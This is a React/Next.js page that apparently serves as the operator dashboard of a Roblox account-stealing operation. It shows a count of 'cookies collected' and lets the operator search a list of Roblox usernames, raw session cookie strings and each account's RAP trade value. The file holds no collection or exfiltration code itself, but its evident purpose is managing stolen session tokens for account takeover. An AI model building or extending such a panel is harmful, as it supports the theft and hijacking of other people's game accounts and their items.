'use client'

import { useState, useEffect } from 'react'
import { HardDrive, Search, Cookie, Shield, AlertCircle } from 'lucide-react'

interface CookieData {
  robloxUsername?: string
  cookie?: string
  robloxRap?: number
}

interface Stats {
  cookies: number
}

export default function StoragePage() {
  const [cookies, setCookies] = useState<CookieData[]>([])
  const [search, setSearch] = useState<string>('')
  const [stats, setStats] = useState<Stats | null>(null)

  useEffect(() => {
    fetch('/api/dashboard')
      .then(r => r.json())
      .then(d => {
        if (d.success) setStats(d.stats)
      })
      .catch(() => {})
  }, [])

  const filteredCookies: CookieData[] = cookies.filter(c => 
    c.robloxUsername?.toLowerCase().includes(search.toLowerCase()) ||
    c.cookie?.toLowerCase().includes(search.toLowerCase())
  )

  return (
    <div className="min-h-screen bg-[#09090b] p-4 pb-24">
      <div className="max-w-2xl mx-auto">
        {/* Header */}
        <div className="flex items-center gap-3 mb-8">
          <div className="w-10 h-10 bg-gradient-to-br from-green-500 to-emerald-500 rounded-xl flex items-center justify-center">
            <HardDrive size={20} />
          </div>
          <div>
            <h1 className="text-2xl font-bold">Storage</h1>
            <p className="text-xs text-gray-500">View collected data</p>
          </div>
        </div>

        {/* Stats Card */}
        {stats && (
          <div className="bg-[#111] border border-[#27272a] rounded-2xl p-6 mb-6">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-3">
                <div className="w-12 h-12 rounded-xl bg-green-500/10 flex items-center justify-center">
                  <Cookie size={24} className="text-green-400" />
                </div>
                <div>
                  <p className="text-sm text-gray-400">Total Cookies Collected</p>
                  <p className="text-3xl font-bold">{stats.cookies}</p>
                </div>
              </div>
              <div className="w-16 h-16 rounded-full border-4 border-green-500/20 border-t-green-500 animate-spin" />
            </div>
          </div>
        )}

        {/* Search Bar */}
        <div className="relative mb-6">
          <div className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500">
            <Search size={18} />
          </div>
          <input
            type="text"
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            placeholder="Search by username or cookie..."
            className="w-full bg-[#111] border border-[#27272a] rounded-xl pl-11 pr-4 py-3.5 text-white placeholder-gray-500 focus:outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 transition-all"
          />
        </div>

        {/* Empty State */}
        {cookies.length === 0 ? (
          <div className="bg-[#111] border border-[#27272a] rounded-2xl p-12 text-center">
            <div className="w-20 h-20 rounded-full bg-gray-800 flex items-center justify-center mx-auto mb-4">
              <Cookie size={40} className="text-gray-600" />
            </div>
            <h3 className="text-lg font-semibold text-gray-400 mb-2">No Cookies Yet</h3>
            <p className="text-sm text-gray-500">Collected cookies will appear here</p>
          </div>
        ) : filteredCookies.length === 0 ? (
          <div className="bg-[#111] border border-[#27272a] rounded-2xl p-12 text-center">
            <AlertCircle size={48} className="text-gray-600 mx-auto mb-4" />
            <h3 className="text-lg font-semibold text-gray-400 mb-2">No Results Found</h3>
            <p className="text-sm text-gray-500">Try adjusting your search query</p>
          </div>
        ) : (
          /* Cookies List */
          <div className="space-y-3">
            {filteredCookies.map((c: CookieData, i: number) => (
              <div key={i} className="bg-[#111] border border-[#27272a] rounded-xl p-4 hover:border-[#3f3f46] transition-colors group">
                <div className="flex justify-between items-start mb-2">
                  <div className="flex items-center gap-3">
                    <div className="w-10 h-10 rounded-lg bg-blue-500/10 flex items-center justify-center text-lg">
                      👤
                    </div>
                    <div>
                      <p className="font-medium text-white group-hover:text-blue-400 transition-colors">
                        {c.robloxUsername || 'Unknown User'}
                      </p>
                      <p className="text-xs text-gray-500">ID: #{i + 1}</p>
                    </div>
                  </div>
                  <div className="text-right">
                    <span className="text-sm font-semibold text-green-400">
                      {c.robloxRap?.toLocaleString()} R$                     </span>
                    <div className="flex items-center gap-1 text-xs text-gray-500 mt-1 justify-end">
                      <Shield size={10} />
                      Verified
                    </div>
                  </div>
                </div>
                <div className="bg-[#09090b] rounded-lg p-3 mt-3">
                  <p className="text-xs text-gray-500 font-mono break-all truncate">
                    {c.cookie}
                  </p>
                </div>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  )
}
